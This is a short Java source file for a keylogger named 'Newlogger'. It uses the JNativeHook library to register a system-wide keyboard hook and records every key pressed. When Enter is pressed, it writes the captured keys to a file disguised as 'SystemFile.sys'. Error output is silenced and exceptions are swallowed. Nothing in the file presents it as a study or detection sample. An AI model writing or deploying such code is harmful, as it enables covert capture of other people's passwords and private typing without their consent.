
package newlogger;

import java.io.File;
import java.io.FileWriter;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Newlogger implements NativeKeyListener {

    String s;
    public void nativeKeyPressed(NativeKeyEvent e){
       // System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        // 
             
       s=s+NativeKeyEvent.getKeyText(e.getKeyCode());

        /* Terminate program when one press ENTER */
        
        if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
         try{
          File f = new File("SystemFile.sys");
          FileWriter fw=new FileWriter(f);
          fw.append(s);
          fw.close();
          
         //GlobalScreen.unregisterNativeHook();
          
         }catch(Exception ef){}
        }
    }

    /* Key Released */
    public void nativeKeyReleased(NativeKeyEvent e) {
       //System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
                
    }

    /* I can't find any output from this call */
    public void nativeKeyTyped(NativeKeyEvent e) {
  //  System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
 
    }

    public static void main(String[] args) throws Exception{
         
        try {
            /* Register jNativeHook */
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
//System.err.println("There was a problem registering the native hook.");
            //System.err.println(ex.getMessage());
            System.exit(1);
        }

        /* Construct the example object and initialze native hook. */
        GlobalScreen.addNativeKeyListener(new Newlogger());
    }
}

        
